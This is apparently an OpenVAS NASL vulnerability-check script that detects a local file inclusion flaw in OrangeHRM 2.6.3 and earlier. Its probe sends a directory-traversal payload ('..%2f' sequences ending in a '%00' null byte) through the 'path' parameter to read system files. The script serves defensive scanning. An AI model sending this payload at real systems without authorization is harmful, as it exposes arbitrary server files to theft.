###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_orangehrm_lfi_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# OrangeHRM 'PluginController.php' Local File Inclusion Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to perform file
inclusion attacks and read arbitrary files on the affected application.

Impact Level: Application";

tag_affected = "OrangeHRM version 2.6.3 and prior";

tag_insight = "The flaw is due to input validation error in
'plugins/PluginController.php' which fails to validate 'path parameter',
which allows attackers to read arbitrary files via a ../(dot dot) sequences.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running with OrangeHRM and is prone to local file
inclusion vulnerability.";

if(description)
{
  script_id(902367);
  script_version("$Revision: 7577 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2011-05-11 15:50:14 +0200 (Wed, 11 May 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("OrangeHRM 'PluginController.php' Local File Inclusion Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17212/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/100823/OrangeHRM2.6.3-lfi.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_dependencies("gb_orangehrm_detect.nasl", "os_detection.nasl");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

# Get OrangeHRM Installed Location
if(!dir = get_dir_from_kb(port:port, app:"orangehrm")){
  exit(0);
}

## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct attack
  url = string(dir, "/plugins/PluginController.php?path=",
                      crap(data:"..%2f",length:3*15),files[file],"%00");
  
  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url,pattern:file))
  {
    security_message(port:port);
    exit(0);
  }
}

